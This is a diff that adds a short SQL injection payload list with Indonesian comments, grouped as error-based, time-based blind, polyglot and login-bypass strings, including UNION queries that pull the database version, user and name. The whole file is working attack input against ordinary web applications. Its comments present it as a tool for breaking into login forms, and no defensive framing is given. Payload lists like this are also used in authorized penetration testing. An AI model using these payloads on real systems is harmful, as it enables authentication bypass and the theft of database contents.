@@ -1,0 +1,23 @@
+# 1. Error-Based (Nyari celah lewat respon error)
+' OR 1=1 -- -
+" OR 1=1 -- -
+' OR '1'='1
+admin' --
+') OR ('1'='1
+
+# 2. Time-Based (Paling ampuh buat Blind SQLi)
+' OR (SELECT 1 FROM (SELECT(SLEEP(5)))a)-- -
+" OR (SELECT 1 FROM (SELECT(SLEEP(5)))a)-- -
+'; WAITFOR DELAY '0:0:5'--
+') OR SLEEP(5)--
+
+# 3. Polyglot (Satu payload buat banyak skenario - GOKIL!)
+SLEEP(5)/*' or SLEEP(5) or '" or SLEEP(5) or "*/
+' UNION SELECT NULL,NULL,NULL,NULL-- -
+' UNION SELECT @@version,user(),database(),NULL-- -
+
+# 4. Auth Bypass (Buat hajar form login)
+admin' #
+admin'--
+' or 1=1 limit 1 -- -
+" or 1=1 limit 1 -- -
